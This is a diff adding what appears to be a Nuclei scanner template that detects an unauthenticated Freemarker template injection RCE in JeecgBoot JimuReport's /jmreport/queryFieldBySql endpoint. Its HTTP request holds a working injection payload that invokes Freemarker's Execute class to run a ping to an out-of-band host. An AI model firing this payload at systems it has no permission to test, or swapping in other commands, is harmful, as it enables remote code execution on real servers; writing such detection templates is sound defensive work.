@@ -1,0 +1,30 @@
+id: jeecgboot-jimureport-freemarker-rce
+
+info:
+  name: JeecgBoot JimuReport Freemarker Template Injection RCE
+  author: security-researcher
+  severity: critical
+  description: JeecgBoot v3.5.3 jimureport component has a Freemarker template injection vulnerability in the /jmreport/queryFieldBySql endpoint, allowing unauthenticated remote code execution.
+  tags: jeecgboot,rce,freemarker,oob
+
+http:
+  - raw:
+      - |
+        POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"sql":"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"ping -c 1 {{interactsh_url}}\")}","type":"0"}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'len(interactsh_request) > 0'
+
+    extractors:
+      - type: dsl
+        name: interactsh_protocol
+        dsl:
+          - 'interactsh_protocol'
+        internal: true
